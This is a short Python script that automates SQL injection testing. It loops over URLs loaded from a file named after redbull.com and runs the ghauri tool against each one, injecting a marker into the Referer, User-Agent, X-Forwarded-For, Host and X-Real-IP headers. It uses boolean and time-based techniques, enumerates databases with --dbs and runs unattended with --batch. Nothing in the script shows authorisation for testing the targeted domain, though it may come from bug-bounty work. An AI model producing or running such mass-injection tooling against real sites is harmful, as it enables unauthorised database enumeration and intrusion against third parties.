import subprocess

# Extended list of headers to test
headers_to_test = [
    "Referer",
    "User-agent",
    "X-Forwarded-For",
    "Host",
    "X-Real-IP"
]

# Load URLs from a file
with open("redbull.com.txt", "r") as file:
    urls = [line.strip() for line in file.readlines() if line.strip()]

for url in urls:
    for header in headers_to_test:
        print(f"[*] Testing {header} on {url}")
        custom_header = f"{header}: teessst.com*"
        cmd = [
            "ghauri",
            "-u", url,
            "--headers", custom_header,
            "--technique", "BT",
            "--random-agent",
            "--dbs",
            "--batch",
        ]
        subprocess.run(cmd)
